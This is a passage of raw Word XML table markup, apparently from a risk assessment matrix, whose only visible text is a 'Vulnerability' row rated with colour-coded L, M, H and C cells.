              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>L</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>H</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="40"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>L</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>H</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>L</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>H</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:right="83"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
